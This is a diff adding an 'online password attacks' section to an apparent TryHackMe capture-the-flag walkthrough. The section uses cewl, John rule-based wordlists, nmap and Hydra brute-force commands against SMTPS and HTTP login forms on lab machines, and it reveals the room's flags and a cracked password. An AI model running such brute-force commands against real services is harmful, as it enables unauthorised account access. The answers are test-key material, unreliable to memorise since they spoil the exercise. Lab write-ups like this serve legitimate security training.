@@ -121,12 +121,117 @@ This guide contains the answer and steps necessary to get to them for the [Passw
 
 ### Online password attacks
 
+As mentioned above, lets first create a custom wordlist based on a website using cewl.
 
-1. 
+```cmd
+cewl -m 8 -w clinic.lst https://clinic.thmredteam.com/
+```
 
+1. Can you guess the FTP credentials without brute-forcing? What is the flag?
+
+   We can try to look for words in our wordlist, but something even easier for ftp is anonymous login. We can see if this is enabled using nmap.
    
+   ```cmd
+   nmap -sV 10.10.207.111
+   nmap -A 10.10.207.111
+   ```
+   
+   ONLINE NMAP
+   
+   ONLINE NMAP ALL
+   
+   Looks like anonymous login is allowed.
+   
+   We can now look for the flag.
+   
+   ONLINE FTP FLAG
+   
+   ><details><summary>Click for answer</summary>THM{d0abe799f25738ad739c20301aed357b}</details>
 
-   ><details><summary>Click for answer</summary></details>
+2. In this question, you need to generate a rule-based dictionary from the wordlist clinic.lst in the previous task. email: pittman@clinic.thmredteam.com against MACHINE_IP:465 (SMTPS).
+
+What is the password? Note that the password format is as follows: [symbol][dictionary word][0-9][0-9].
+
+   sudo vi /etc/john/john.conf
+   
+   ```cmd
+   [List.Rules:THM-Password-Attacks]
+   Az"[0-9][0-9]" ^[!@]
+   ```
+   
+   ONLINE JOHN CONFIG
+   
+   ```cmd
+   john --wordlist=clinic.lst --rules=THM-Password-Attacks --stdout > wordlist.txt
+   ```
+   
+   Now we can use Hydra to attack the smtps service with the wordlist created with John.
+   
+   ```cmd
+   hydra -l pittman@clinic.thmredteam.com -P wordlist2.txt smtps://10.10.155.132 -Vv
+   ```
+
+   ONLINE SMTP PASSWORD
+
+   ><details><summary>Click for answer</summary>!multidisciplinary00</details>
+
+3. Perform a brute-forcing attack against the phillips account for the login page at http://MACHINE_IP/login-get using hydra? What is the flag?
+
+   For this we will use the same word list, but a different username and attack method. We first need to find out what the format of the request is.
+   
+   ONLINE HTTP FORM
+   
+   Here we see the format and the error message we get when attempting to login using wrong credentials.
+   
+   For Hydra we will then use the following command:
+   
+   ```cmd
+   hydra -l phillips -P wordlist2.txt 10.10.155.132 http-get-form "/login-get/index.php:username=^USER^&password=^PASS^:F=failed"
+   ```
+
+   Unfortunately, it never seemed to take to failed condition. Using a success condition somehow did work.
+   
+   ```cmd
+   S=logout.php
+   ```
+   
+   ONLINE HTTP PASSWORD
+   
+   Now we can login with these credentials and find the flag.
+   
+   ONLINE HTTP FLAG
+
+   ><details><summary>Click for answer</summary>THM{33c5d4954da881814420f3ba39772644}</details>
+
+4. Perform a rule-based password attack to gain access to the burgess account. Find the flag at the following website: http://MACHINE_IP/login-post/. What is the flag?
+
+Note: use the clinic.lst dictionary in generating and expanding the wordlist!
+
+   First thing we need to do is expand the previously created clinic.lst using johns single-extra rule.
+   
+   ```cmd
+   john --wordlist=clinic.lst --rules=Single-Extra --stdout > wordlist-http.txt
+   ```
+   
+   We should also check the form page and get the failed login attempt message.
+   
+   ONLINE HTTP POST FORM
+   
+   Note: Unfortunately, this again wouldn't work with the F argument. So I opted to use the S argument instead.
+      
+   Now we can use hydra to attack the post form.
+   
+   ```cmd
+   hydra -l burgess -P wordlist-http.txt 10.10.155.132 http-post-form "/login-post/index.php:username=^USER^&password=^PASS^:S=logout.php"
+   ```
+   
+   ONLINE HTTP POST PASSWORD
+   
+   Now we only have to log into the page and get the flag.
+   
+   ONLINE HTTP POST FLAG
+
+   ><details><summary>Click for answer</summary>THM{f8e3750cc0ccbb863f2706a3b2933227}</details>
 
 ### Password spray attack 
 
